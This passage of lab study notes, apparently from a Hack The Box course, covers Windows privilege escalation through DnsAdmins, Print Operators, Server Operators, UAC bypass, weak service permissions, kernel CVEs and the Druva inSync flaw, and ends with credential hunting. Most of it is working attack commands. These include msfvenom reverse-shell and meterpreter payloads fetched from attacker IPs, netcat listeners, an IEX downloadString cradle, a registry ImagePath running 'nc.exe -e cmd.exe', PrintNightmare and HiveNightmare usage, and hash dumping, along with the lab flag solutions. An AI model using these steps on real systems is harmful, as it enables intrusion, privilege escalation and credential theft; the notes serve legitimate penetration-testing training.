- As detailed in this [post](http://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html), we could also utilize [mimilib.dll](https://github.com/gentilkiwi/mimikatz/tree/master/mimilib) from the creator of the `Mimikatz` tool to gain command execution by modifying the [kdns.c](https://github.com/gentilkiwi/mimikatz/blob/master/mimilib/kdns.c) file to execute a reverse shell one-liner or another command of our choosing.

## Creating a WPAD Record
- Another way to abuse DnsAdmins group privileges is by creating a WPAD record. Membership in this group gives us the rights to [disable global query block security](https://docs.microsoft.com/en-us/powershell/module/dnsserver/set-dnsserverglobalqueryblocklist?view=windowsserver2019-ps), which by default blocks this attack. Server 2008 first introduced the ability to add to a global query block list on a DNS server. 
 
	-> By default, Web Proxy Automatic Discovery Protocol (WPAD) and Intra-site Automatic Tunnel Addressing Protocol (ISATAP) are on the global query block list. 
	
	-> These protocols are quite vulnerable to hijacking, and any domain user can create a computer object or DNS record containing those names.

- Disabling the Global Query Block List
C:\htb> Set-DnsServerGlobalQueryBlockList -Enable $false -ComputerName dc01.inlanefreight.local

- Adding a WPAD Record
C:\htb> Add-DnsServerResourceRecordA -Name wpad -ZoneName inlanefreight.local -ComputerName dc01.inlanefreight.local -IPv4Address 10.10.14.3

## Questions
Q:Leverage membership in the DnsAdmins group to escalate privileges. Submit the contents of the flag located at c:\Users\Administrator\Desktop\DnsAdmins\flag.txt

- Follow sections on ## Leveraging DnsAdmins Access
msfvenom -p windows/x64/exec cmd='net group "domain admins" netadm /add /domain' -f dll -o adduser.dll

python3 -m http.server 7777
wget "http://10.10.16.13:7777/adduser.dll" -outfile "adduser.dll"

C:\htb> dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\Desktop\adduser.dll

C:\htb> Get-ADGroupMember -Identity DnsAdmins

C:\htb> dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\Desktop\adduser.dll

C:\htb> wmic useraccount where name="netadm" get sid
C:\htb> sc.exe sdshow DNS

C:\htb> sc stop dns
C:\htb> sc start dns
C:\htb> net group "Domain Admins" /dom

- relogin (logout + rdp sign in again)

more c:\Users\Administrator\Desktop\DnsAdmins\flag.txt
```

#### Hyper-V Administrators
```
## Overview
- The [Hyper-V Administrators](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#hyper-v-administrators) group has full access to all [Hyper-V features](https://docs.microsoft.com/en-us/windows-server/manage/windows-admin-center/use/manage-virtual-machines). 
	
	-> If Domain Controllers have been virtualized, then the virtualization admins should be considered Domain Admins. 
	
	-> They could easily create a clone of the live Domain Controller and mount the virtual disk offline to obtain the NTDS.dit file and extract NTLM password hashes for all users in the domain.

- Target File
C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe

- Taking Ownership of the File
C:\htb> takeown /F C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe

- Starting the Mozilla Maintenance Service
C:\htb> sc.exe start MozillaMaintenance

Note: This vector has been mitigated by the March 2020 Windows security updates, which changed behavior relating to hard links.
```

#### Print Operators
```
## Overview
- [Print Operators](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#print-operators) is another highly privileged group, which grants its members the `SeLoadDriverPrivilege`, rights to manage, create, share, and delete printers connected to a Domain Controller, as well as the ability to log on locally to a Domain Controller and shut it down.
 
	-> If we issue the command `whoami /priv`, and don't see the `SeLoadDriverPrivilege` from an unelevated context, we will need to bypass UAC.

- Confirming Privileges
C:\htb> whoami /priv

- Bypass UAC through elevated shell from Print Operator's group

- Checking Privileges Again
whoami /priv

- Edit code in Capcom.sys
#include <windows.h>
#include <assert.h>
#include <winternl.h>
#include <sddl.h>
#include <stdio.h>
#include "tchar.h"

- Compile with cl.exe
C:\Users\mrb3n\Desktop\Print Operators>cl /DUNICODE /D_UNICODE EnableSeLoadDriverPrivilege.cpp

Microsoft (R) C/C++ Optimizing Compiler Version 19.28.29913 for x86
Copyright (C) Microsoft Corporation.  All rights reserved.

EnableSeLoadDriverPrivilege.cpp
Microsoft (R) Incremental Linker Version 14.28.29913.0
Copyright (C) Microsoft Corporation.  All rights reserved.

/out:EnableSeLoadDriverPrivilege.exe
EnableSeLoadDriverPrivilege.obj
or
- Use built in EnableSeLoadDriverPrivilege.exe

- Add Reference to Driver
C:\htb> reg add HKCU\System\CurrentControlSet\CAPCOM /v ImagePath /t REG_SZ /d "\??\C:\Tools\Capcom.sys"

- Verify Driver is not Loaded
C:\htb> reg add HKCU\System\CurrentControlSet\CAPCOM /v Type /t REG_DWORD /d 1

PS C:\htb> .\DriverView.exe /stext drivers.txt
PS C:\htb> cat drivers.txt | Select-String -pattern Capcom

- Verify Privilege is Enabled
C:\htb> EnableSeLoadDriverPrivilege.exe

- Verify Capcom Driver is Listed
PS C:\htb> .\DriverView.exe /stext drivers.txt
PS C:\htb> cat drivers.txt | Select-String -pattern Capcom

Driver Name           : Capcom.sys
Filename              : C:\Tools\Capcom.sys

PS C:\htb> .\ExploitCapcom.exe

- Get source code for exploit in ExplotCapcom in module

## Alternate Exploitation - No GUI

- If we do not have GUI access to the target, we will have to modify the `ExploitCapcom.cpp` code before compiling.
 
	-> Here we can edit line 292 and replace `"C:\\Windows\\system32\\cmd.exe"` with, say, a reverse shell binary created with `msfvenom`, for example: `c:\ProgramData\revshell.exe`.

// Launches a command shell process
static bool LaunchShell()
{
    TCHAR CommandLine[] = TEXT("C:\\Windows\\system32\\cmd.exe");
    PROCESS_INFORMATION ProcessInfo;
    STARTUPINFO StartupInfo = { sizeof(StartupInfo) };
    if (!CreateProcess(CommandLine, CommandLine, nullptr, nullptr, FALSE,
        CREATE_NEW_CONSOLE, nullptr, nullptr, &StartupInfo,
        &ProcessInfo))
    {
        return false;
    }

    CloseHandle(ProcessInfo.hThread);
    CloseHandle(ProcessInfo.hProcess);
    return true;
}
- Change to somethig like  TCHAR CommandLine[] = TEXT("C:\\ProgramData\\revshell.exe");

## Automating the Steps

- Automating with EopLoadDriver
C:\htb> EoPLoadDriver.exe System\CurrentControlSet\Capcom c:\Tools\Capcom.sys

- We would then run `ExploitCapcom.exe` to pop a SYSTEM shell or run our custom binary.

## Clean-up

- Removing Registry Key
C:\htb> reg delete HKCU\System\CurrentControlSet\Capcom

Note: Since Windows 10 Version 1803, the "SeLoadDriverPrivilege" is not exploitable, as it is no longer possible to include references to registry keys under "HKEY_CURRENT_USER".

## Questions
Follow the steps in this section to escalate privileges to SYSTEM, and submit the contents of the flag.txt file on administrator's Desktop. Necessary tools for both methods can be found in the C:\Tools directory, or you can practice compiling and uploading them on your own.

- Follow sections on ## Overview
C:\htb> whoami /priv
C:\htb> reg add HKCU\System\CurrentControlSet\CAPCOM /v ImagePath /t REG_SZ /d "\??\C:\Tools\Capcom.sys"

C:\htb> reg add HKCU\System\CurrentControlSet\CAPCOM /v Type /t REG_DWORD /d 1

PS C:\htb> .\DriverView.exe /stext drivers.txt
PS C:\htb> cat drivers.txt | Select-String -pattern Capcom

C:\htb> EnableSeLoadDriverPrivilege.exe

PS C:\htb> .\DriverView.exe /stext drivers.txt
PS C:\htb> cat drivers.txt | Select-String -pattern Capcom

PS C:\htb> .\ExploitCapcom.exe

more C:\users\Administrator\Desktop\flag.txt
```

#### Server Operators
```cmd-session
## Overview
- The [Server Operators](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#bkmk-serveroperators) group allows members to administer Windows servers without needing assignment of Domain Admin privileges.
 
	-> It is a very highly privileged group that can log in locally to servers, including Domain Controllers.

Membership of this group confers the powerful `SeBackupPrivilege` and `SeRestorePrivilege` privileges and the ability to control local services.

- Querying the AppReadiness Service
C:\htb> sc qc AppReadiness

- Checking Service Permissions with PsService
C:\htb> c:\Tools\PsService.exe security AppReadiness

- Checking Local Admin Group Membership
C:\htb> net localgroup Administrators

- Modifying the Service Binary Path
C:\htb> sc config AppReadiness binPath= "cmd /c net localgroup Administrators server_adm /add"

- Starting the Service
C:\htb> sc start AppReadiness

- Confirming Local Admin Group Membership
C:\htb> net localgroup Administrators

- Confirming Local Admin Access on Domain Controller
crackmapexec smb 10.129.43.9 -u server_adm -p 'HTB_@cademy_stdnt!'


- Retrieving NTLM Password Hashes from the Domain Controller
secretsdump.py server_adm@10.129.43.9 -just-dc-user administrator

## Questions
Q:Escalate privileges using the methods shown in this section and submit the contents of the flag located at c:\Users\Administrator\Desktop\ServerOperators\flag.txt

C:\htb> sc qc AppReadiness

C:\htb> c:\Tools\PsService.exe security AppReadiness

C:\htb> net localgroup Administrators

C:\htb> sc config AppReadiness binPath= "cmd /c net localgroup Administrators server_adm /add"

C:\htb> sc start AppReadiness
C:\htb> net localgroup Administrators

- Sign out and log in

C:\htb> more c:\Users\Administrator\Desktop\ServerOperators\flag.txt
```

## Attacking the OS

#### User Account Control
```
## Overview
- [User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) is a feature that enables a consent prompt for elevated activities. 
 
	-> Applications have different `integrity` levels, and a program with a high level can perform tasks that could potentially compromise the system.
	
	-> When UAC is enabled, applications and tasks always run under the security context of a non-administrator account unless an administrator explicitly authorizes these applications/tasks to have administrator-level access to the system to run.
	
	-> It is a convenience feature that protects administrators from unintended changes but is not considered a security boundary.

- Checking Current User
C:\htb> whoami /user

- Confirming Admin Group Membership
C:\htb> net localgroup administrators

-  Reviewing User Privileges
C:\htb> whoami /priv

- Confirming UAC is Enabled
C:\htb> REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA

- Checking UAC Level
C:\htb> REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin

- Checking Windows Version
PS C:\htb> [environment]::OSVersion.Version
[environment]::OSVersion.Version

[this](https://en.wikipedia.org/wiki/Windows_10_version_history)

-> Look into https://github.com/hfiref0x/UACME for UAC bypass guides

- Reviewing Path Variable
PS C:\htb> cmd /c echo %PATH%

- Generating Malicious srrstr.dll DLL
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.3 LPORT=8443 -f dll > srrstr.dll

Note: In the example above, we specified our tun0 VPN IP address.

- Starting Python HTTP Server on Attack Host
sudo python3 -m http.server 8080

- Downloading DLL Target
PS C:\htb>curl http://10.10.14.3:8080/srrstr.dll -O "C:\Users\sarah\AppData\Local\Microsoft\WindowsApps\srrstr.dll"

- Starting nc Listener on Attack Host
areaeric@htb[/htb]$ nc -lvnp 8443

- Testing Connection
C:\htb> rundll32 shell32.dll,Control_RunDLL C:\Users\sarah\AppData\Local\Microsoft\WindowsApps\srrstr.dll

C:\Users\sarah> whoami /priv

- #### Executing SystemPropertiesAdvanced.exe on Target Host
C:\htb> C:\Windows\SysWOW64\SystemPropertiesAdvanced.exe


areaeric@htb[/htb]$ nc -lvnp 8443
C:\Windows\system32>whoami
C:\Windows\system32>whoami /priv

## Questions
Follow the steps in this section to obtain a reverse shell connection with normal user privileges and another which bypasses UAC. Submit the contents of flag.txt on the sarah user's Desktop when finished.

- Follow sections on ## Overview
C:\htb> whoami /user

C:\htb> net localgroup administrators

C:\htb> whoami /priv

C:\htb> REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA

C:\htb> REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin

PS C:\htb> [environment]::OSVersion.Version
[environment]::OSVersion.Version

[this](https://en.wikipedia.org/wiki/Windows_10_version_history)

- View Github for authors/blogs/exploits technique to look for:
Look into https://github.com/hfiref0x/UACME for UAC bypass techniques

PS C:\htb> cmd /c echo %PATH%

msfvenom -p windows/shell_reverse_tcp LHOST=10.10.16.13 LPORT=8443 -f dll > srrstr.dll

sudo python3 -m http.server

PS C:\htb>curl http://10.10.16.13:8000/srrstr.dll -O "C:\Users\sarah\AppData\Local\Microsoft\WindowsApps\srrstr.dll"

areaeric@htb[/htb]$ nc -lvnp 8443

C:\htb> C:\Windows\SysWOW64\SystemPropertiesAdvanced.exe

-> bypassed UAC in manual manner (no GUI)

more C:\users\sarah\Desktop\flag.txt
```

#### Weak Permissions
```
## Overview
- Permissions on Windows systems are complicated and challenging to get right.
 
		-> A slight modification in one place may introduce a flaw elsewhere. 
		-> As penetration testers, we need to understand how permissions work in Windows and the various ways that misconfigurations can be leveraged to escalate privileges. 
		
		-> The permissions-related flaws discussed in this section are relatively uncommon in software applications put out by large vendors (but are seen from time to time) but are common in third-party software from smaller vendors, open-source software, and custom applications. Services usually install with SYSTEM privileges, so leveraging a service permissions-related flaw can often lead to complete control over the target system. 
		
		-> Regardless of the environment, we should always check for weak permissions and be able to do it both with the help of tools and manually in case we are in a situation where we don't have our tools readily available.

## Permissive File System ACLs

- Running SharpUp
PS C:\htb> .\SharpUp.exe audit

- Checking Permissions with icacls
PS C:\htb> icacls "C:\Program Files (x86)\PCProtect\SecurityService.exe"

- Replacing Service Binary
C:\htb> cmd /c copy /Y SecurityService.exe "C:\Program Files (x86)\PCProtect\SecurityService.exe"
C:\htb> sc start SecurityService

## Weak Service Permissions

- Reviewing SharpUp Again
C:\htb> SharpUp.exe audit

- Checking Permissions with AccessChk
C:\htb> accesschk.exe /accepteula -quvcw WindscribeService

- Check Local Admin Group
C:\htb> net localgroup administrators

- Changing the Service Binary Path
C:\htb> sc config WindscribeService binpath="cmd /c net localgroup administrators htb-student /add"

- Stopping Service
C:\htb> sc stop WindscribeService

- Starting the Service
C:\htb> sc start WindscribeService

- Confirming Local Admin Group Addition
C:\htb> net localgroup administrators

## Weak Service Permissions - Cleanup

- We can clean up after ourselves and ensure that the service is working correctly by stopping it and resetting the binary path back to the original service executable.

- Reverting the Binary Path
C:\htb> sc config WindScribeService binpath="c:\Program Files (x86)\Windscribe\WindscribeService.exe"

- Starting the Service Again
C:\htb> sc start WindScribeService

- Verifying Service is Running
C:\htb> sc query WindScribeService

## Unquoted Service Path

- When a service is installed, the registry configuration specifies a path to the binary that should be executed on service start.
 
	-> If this binary is not encapsulated within quotes, Windows will attempt to locate the binary in different folders. Take the example binary path below.

C:\Program Files (x86)\System Explorer\service\SystemExplorerService64.exe

-> attempts to load from:
- `C:\Program`
- `C:\Program Files`
- `C:\Program Files (x86)\System`
- `C:\Program Files (x86)\System Explorer\service\SystemExplorerService64`

- Querying Service
C:\htb> sc qc SystemExplorerHelpService

- Searching for Unquoted Service Paths
C:\htb> wmic service get name,displayname,pathname,startmode |findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """
- Not often exploitable.

## Permissive Registry ACLs

- It is also worth searching for weak service ACLs in the Windows Registry. We can do this using `accesschk`.

- Checking for Weak Service ACLs in Registry
C:\htb> accesschk.exe /accepteula "mrb3n" -kvuqsw hklm\System\CurrentControlSet\services

- Changing ImagePath with PowerShell
PS C:\htb> Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\ModelManagerService -Name "ImagePath" -Value "C:\Users\john\Downloads\nc.exe -e cmd.exe 10.10.10.205 443"

## Modifiable Registry Autorun Binary
- Check Startup Programs
PS C:\htb> Get-CimInstance Win32_StartupCommand | select Name, command, Location, User |fl

## Questions
Escalate privileges on the target host using the techniques demonstrated in this section. Submit the contents of the flag in the WeakPerms folder on the Administrator Desktop.
- Using ## Permissive File System ACLs way
net localgroup administrators htb-student /add

msfvenom -p windows/shell_reverse_tcp LHOST=10.10.16.13 LPORT=8443 -f exe  -o SecurityService.exe

python -m http.server

nc -lvnp 8443
wget "http://10.10.16.13:8000/SecurityService.exe" -outfile "SecurityService.exe"

C:\htb> cmd /c copy /Y SecurityService.exe "C:\Program Files (x86)\PCProtect\SecurityService.exe"
C:\htb> sc start SecurityService

cd C:\users\administrator\Desktop\WeakPerms
more flag.txt

- Additionals:
Adding to local admin for convenience
net localgroup administrators htb-student /add

net user htb-student

// Weak Service permissions way

C:\htb> SharpUp.exe audit

C:\htb> accesschk.exe /accepteula -quvcw WindscribeService

C:\htb> net localgroup administrators

C:\htb> sc config WindscribeService binpath="cmd /c net localgroup administrators htb-student /add"

C:\htb> sc stop WindscribeService

C:\htb> sc start WindscribeService

C:\htb> net localgroup administrators
```

## Kernel Exploits
```
## Overview
- It's a big challenge to ensure that all user desktops and servers are updated, and 100% compliance for all computers with security patches is likely not an achievable goal. 

	-> Assuming a computer has been targeted for installation of updates, for example, using SCCM (Microsoft System Center Configuration Manager) or WSUS (Windows Server Update Services), there are still many reasons they could fail to install. 
	
	-> Over the years, there have been many kernel exploits that affect the Windows operating system from Windows 2000/XP up to Windows 10/Server 2016/2019. Below can be found a detailed table of known remote code execution/local privilege escalation exploits for Windows operating systems, broken down by service pack level, from Windows XP onward to Server 2016.

## Notable Vulnerabilities
- Over the years, there have been many high-impact Windows vulnerabilities that can be leveraged to escalate privileges, some being purely local privilege escalation vectors and others being remote code execution (RCE) flaws that can be used to escalate privileges by forwarding a local port. 
 
	-> One example of the latter would be landing on a box that does not allow access to port 445 from the outside, performing port forward to access this port from our attack box, and leveraging a remote code execution flaw against the SMB service to escalate privileges. 
	
	-> Below are some extremely high-impact Windows vulnerabilities over the years that can be leveraged to escalate privileges.

- Checking Permissions on the SAM File
C:\htb> icacls c:\Windows\System32\config\SAM

- Performing Attack and Parsing Password Hashes
PS C:\Users\htb-student\Desktop> .\HiveNightmare.exe

secretsdump.py -sam SAM-2021-08-07 -system SYSTEM-2021-08-07 -security SECURITY-2021-08-07 local

- Checking for Spooler Service
PS C:\htb> ls \\localhost\pipe\spoolss

- Adding Local Admin with PrintNightmare PowerShell PoC
PS C:\htb> Set-ExecutionPolicy Bypass -Scope Process

PS C:\htb> Import-Module .\CVE-2021-1675.ps1
PS C:\htb> Invoke-Nightmare -NewUser "hacker" -NewPassword "Pwnd1234!" -DriverName "PrintIt"

- Confirming New Admin User
PS C:\htb> net user hacker

## Enumerating Missing Patches

- The first step is looking at installed updates and attempting to find updates that may have been missed, thus, opening up an attack path for us.

- Examining Installed Updates
PS C:\htb> systeminfo
PS C:\htb> wmic qfe list brief
PS C:\htb> Get-Hotfix

- Viewing Installed Updates with WMI
C:\htb> wmic qfe list brief

## CVE-2020-0668 Example

- Next, let's exploit [Microsoft CVE-2020-0668: Windows Kernel Elevation of Privilege Vulnerability](https://itm4n.github.io/cve-2020-0668-windows-service-tracing-eop/), which exploits an arbitrary file move vulnerability leveraging the Windows Service Tracing. 
 
	-> Service Tracing allows users to troubleshoot issues with running services and modules by generating debug information.
	
	-> Its parameters are configurable using the Windows registry. Setting a custom MaxFileSize value that is smaller than the size of the file prompts the file to be renamed with a `.OLD` extension when the service is triggered. 
	
	-> This move operation is performed by `NT AUTHORITY\SYSTEM`, and can be abused to move a file of our choosing with the help of mount points and symbolic links.

- Checking Current User Privileges
C:\htb> whoami /priv

- After Building Solution
CVE-2020-0668.exe
CVE-2020-0668.exe.config
CVE-2020-0668.pdb
NtApiDotNet.dll
NtApiDotNet.xml
or use pre-compiled version givven by HTB

- Checking Permissions on Binary
C:\htb> icacls "c:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"

- Generating Malicious Binary
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.14.3 LPORT=8443 -f exe > maintenanceservice.exe

- Hosting the Malicious Binary
python3 -m http.server 8080

- Downloading the Malicious Binary
PS C:\htb> wget http://10.10.15.244:8080/maintenanceservice.exe -O maintenanceservice.exe
PS C:\htb> wget http://10.10.15.244:8080/maintenanceservice.exe -O maintenanceservice2.exe

- Running the Exploit
C:\htb> C:\Tools\CVE-2020-0668\CVE-2020-0668.exe C:\Users\htb-student\Desktop\maintenanceservice.exe "C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"  

- Checking Permissions of New File
C:\htb> icacls 'C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe'

- Replacing File with Malicious Binary
C:\htb> copy /Y C:\Users\htb-student\Desktop\maintenanceservice2.exe "c:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"

- Metasploit Resource Script
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_https
set LHOST <our_ip>
set LPORT 8443
exploit

- Launching Metasploit with Resource Script
sudo msfconsole -r handler.rc 

- Starting the Service
C:\htb> net start MozillaMaintenance 

- Receiving a Meterpreter Session
meterpreter > getuid
meterpreter > sysinfo
meterpreter > hashdump

## Questions
Q:Try out the 3 examples in this section to escalate privileges to NT AUTHORITY\SYSTEM on the target host. Submit the contents of the flag on the Administrator Desktop.

- Using related sections (hivenightmare) in ## Notable Vulnerabilities
- Done exactly as fOllow


- using related section (Printer Spooler) in ##Notable Vulnerabilties

PS C:\htb> ls \\localhost\pipe\spoolss

PS C:\htb> Set-ExecutionPolicy Bypass -Scope Process
set-ExecutionPolicy Bypass -Scope Process
PS C:\htb> Import-Module .\CVE-2021-1675.ps1
PS C:\htb> Invoke-Nightmare -NewUser "hacker" -NewPassword "Pwnd1234!" -DriverName "PrintIt"

PS C:\htb> net user hacker

net user hacker

xfreerdp +bitmap-cache /network:auto /dynamic-resolution /compression-level:2 /u:hacker /p:'Pwnd1234!' /v:10.129.43.13 /tls-seclevel:0 /timeout:80000

- Done using exactly as follows in ## CVE-2020-0668
```

#### Vulnerable Services
```
## Overview
- We may be able to escalate privileges on well-patched and well-configured systems if users are permitted to install software or vulnerable third-party applications/services are used throughout the organization. 
 
	-> It is common to encounter a multitude of different applications and services on Windows workstations during our assessments.
	
	-> Let's look at an instance of a vulnerable service that we could come across in a real-world environment. 
	
	-> Some services/applications may allow us to escalate to SYSTEM. In contrast, others could cause a denial-of-service condition or allow access to sensitive data such as configuration files containing passwords.

- Enumerating Installed Programs
C:\htb> wmic product get name

- Enumerating Local Ports
C:\htb> netstat -ano | findstr 6064

- Enumerating Process ID
PS C:\htb> get-process -Id 3324

- Enumerating Running Service
PS C:\htb> get-service | ? {$_.DisplayName -like 'Druva*'}

## Druva inSync Windows Client Local Privilege Escalation Example

- Druva inSync PowerShell PoC
$ErrorActionPreference = "Stop"

$cmd = "net user pwnd /add"

$s = New-Object System.Net.Sockets.Socket(
    [System.Net.Sockets.AddressFamily]::InterNetwork,
    [System.Net.Sockets.SocketType]::Stream,
    [System.Net.Sockets.ProtocolType]::Tcp
)
$s.Connect("127.0.0.1", 6064)

$header = [System.Text.Encoding]::UTF8.GetBytes("inSync PHC RPCW[v0002]")
$rpcType = [System.Text.Encoding]::UTF8.GetBytes("$([char]0x0005)`0`0`0")
$command = [System.Text.Encoding]::Unicode.GetBytes("C:\ProgramData\Druva\inSync4\..\..\..\Windows\System32\cmd.exe /c $cmd");
$length = [System.BitConverter]::GetBytes($command.Length);

$s.Send($header)
$s.Send($rpcType)
$s.Send($length)
$s.Send($command)

- Modifying PowerShell PoC, put at bottom of shell.ps1
Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.3 -Port 9443

- Modify the $cmd variable in the Druva inSync exploit PoC
$cmd = "powershell IEX(New-Object Net.Webclient).downloadString('http://10.10.14.3:8080/shell.ps1')"

- Starting a Python Web Server
python3 -m http.server 8080

- Catching a SYSTEM Shell

	-> Finally, start a `Netcat` listener on the attack box and execute the PoC PowerShell script on the target host (after [modifying the PowerShell execution policy](https://www.netspi.com/blog/technical/network-penetration-testing/15-ways-to-bypass-the-powershell-execution-policy) with a command such as `Set-ExecutionPolicy Bypass -Scope Process`).
	
	-> We will get a reverse shell connection back with `SYSTEM` privileges if all goes to plan.

Set-ExecutionPolicy Bypass -Scope Process

.\druva.ps1

nc -lvnp 9443
PS C:\WINDOWS\system32>whoami
PS C:\WINDOWS\system32> hostname

## Questions
Work through the steps above to escalate privileges on the target system using the Druva inSync flaw. Submit the contents of the flag in the VulServices folder on the Administrator Desktop.

- Direct follow of section (## Overview for enumeration and #### Druva inSync Windows Client Local Privilege Escalation Example for privesc)

cd C:\users\administrator\Desktop\VulServices
cat flag.txt
```

#### DLL Injection

```
## Overview
- `DLL injection` is a method that involves inserting a piece of code, structured as a Dynamic Link Library (DLL), into a running process. T
 
	-> his technique allows the inserted code to run within the process's context, thereby influencing its behavior or accessing its resources.

## LoadLibrary
- `LoadLibrary` is a widely utilized method for DLL injection, employing the `LoadLibrary` API to load the DLL into the target process's address space.

- The `LoadLibrary` API is a function provided by the Windows operating system that loads a Dynamic Link Library (DLL) into the current processs memory and returns a handle that can be used to get the addresses of functions within the DLL.

#include <windows.h>
#include <stdio.h>

int main() {
    // Using LoadLibrary to load a DLL into the current process
    HMODULE hModule = LoadLibrary("example.dll");
    if (hModule == NULL) {
        printf("Failed to load example.dll\n");
        return -1;
    }
    printf("Successfully loaded example.dll\n");

    return 0;
}


#include <windows.h>
#include <stdio.h>

int main() {
    // Using LoadLibrary for DLL injection
    // First, we need to get a handle to the target process
    DWORD targetProcessId = 123456 // The ID of the target process
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetProcessId);
    if (hProcess == NULL) {
        printf("Failed to open target process\n");
        return -1;
    }

    // Next, we need to allocate memory in the target process for the DLL path
    LPVOID dllPathAddressInRemoteMemory = VirtualAllocEx(hProcess, NULL, strlen(dllPath), MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
    if (dllPathAddressInRemoteMemory == NULL) {
        printf("Failed to allocate memory in target process\n");
        return -1;
    }

    // Write the DLL path to the allocated memory in the target process
    BOOL succeededWriting = WriteProcessMemory(hProcess, dllPathAddressInRemoteMemory, dllPath, strlen(dllPath), NULL);
    if (!succeededWriting) {
        printf("Failed to write DLL path to target process\n");
        return -1;
    }

    // Get the address of LoadLibrary in kernel32.dll
    LPVOID loadLibraryAddress = (LPVOID)GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");
    if (loadLibraryAddress == NULL) {
        printf("Failed to get address of LoadLibraryA\n");
        return -1;
    }

    // Create a remote thread in the target process that starts at LoadLibrary and points to the DLL path
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)loadLibraryAddress, dllPathAddressInRemoteMemory, 0, NULL);
    if (hThread == NULL) {
        printf("Failed to create remote thread in target process\n");
        return -1;
    }

    printf("Successfully injected example.dll into target process\n");

    return 0;
}
- The second example illustrates the use of `LoadLibrary` for DLL injection. This process involves allocating memory within the target process for the DLL path and then initiating a remote thread that begins at `LoadLibrary` and directs towards the DLL path.

## Manual Mapping

- `Manual Mapping` is an incredibly complex and advanced method of DLL injection. It involves the manual loading of a DLL into a process's memory and resolves its imports and relocations. 
 
	-> However, it avoids easy detection by not using the `LoadLibrary` function, whose usage is monitored by security and anti-cheat systems.

## Reflective DLL Injection

`Reflective DLL injection` is a technique that utilizes reflective programming to load a library from memory into a host process. 

	-> The library itself is responsible for its loading process by implementing a minimal Portable Executable (PE) file loader. 
	
	-> This allows it to decide how it will load and interact with the host, minimising interaction with the host system and process.

## DLL Hijacking
- `DLL Hijacking` is an exploitation technique where an attacker capitalizes on the Windows DLL loading process. 

	-> These DLLs can be loaded during runtime, creating a hijacking opportunity if an application doesn't specify the full path to a required DLL, hence rendering it susceptible to such attacks.
```

## Credential Theft

#### Credential Hunting
```
## Overview
- Credentials can unlock many doors for us during our assessments. 
 
	-> We may find credentials during our privilege escalation enumeration that can lead directly to local admin access, grant us a foothold into the Active Directory domain environment, or even be used to escalate privileges within the domain. 
	
	-> There are many places that we may find credentials on a system, some more obvious than others.

## Application Configuration Files
- Searching for Files
PS C:\htb> findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml
- useful documentation https://ss64.com/nt/findstr.html

## Dictionary Files

- Chrome Dictionary Files
PS C:\htb> gc 'C:\Users\htb-student\AppData\Local\Google\Chrome\User Data\Default\Custom Dictionary.txt' | Select-String password

## Unattended Installation Files

- Unattended installation files may define auto-logon settings or additional accounts to be created as part of the installation. Passwords in the `unattend.xml` are stored in plaintext or base64 encoded.

- Unattended XML file
<?xml version="1.0" encoding="utf-8"?>
<unattend xmlns="urn:schemas-microsoft-com:unattend">
    <settings pass="specialize">
        <component name="Microsoft-Windows-Shell-Setup" processorArchitecture="amd64" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" xmlns:wcm="http://schemas.microsoft.com/WMIConfig/2002/State" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
            <AutoLogon>
                <Password>
                    <Value>local_4dmin_p@ss</Value>
                    <PlainText>true</PlainText>
                </Password>
                <Enabled>true</Enabled>
                <LogonCount>2</LogonCount>
                <Username>Administrator</Username>
            </AutoLogon>
            <ComputerName>*</ComputerName>
        </component>
    </settings>

## PowerShell History File
-Command to

Starting with Powershell 5.0 in Windows 10, PowerShell stores command history to the file:

	- `C:\Users\<username>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt`

- Confirming PowerShell History Save Path
PS C:\htb> (Get-PSReadLineOption).HistorySavePath

- Reading PowerShell History File
PS C:\htb> gc (Get-PSReadLineOption).HistorySavePath

PS C:\htb> foreach($user in ((ls C:\users).fullname)){cat "$user\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt" -ErrorAction SilentlyContinue}

## PowerShell Credentials
- PowerShell credentials are often used for scripting and automation tasks as a way to store encrypted credentials conveniently.
 
	-> The credentials are protected using [DPAPI](https://en.wikipedia.org/wiki/Data_Protection_API), which typically means they can only be decrypted by the same user on the same computer they were created on.
	
# Connect-VC.ps1
# Get-Credential | Export-Clixml -Path 'C:\scripts\pass.xml'
$encryptedPassword = Import-Clixml -Path 'C:\scripts\pass.xml'
$decryptedPassword = $encryptedPassword.GetNetworkCredential().Password
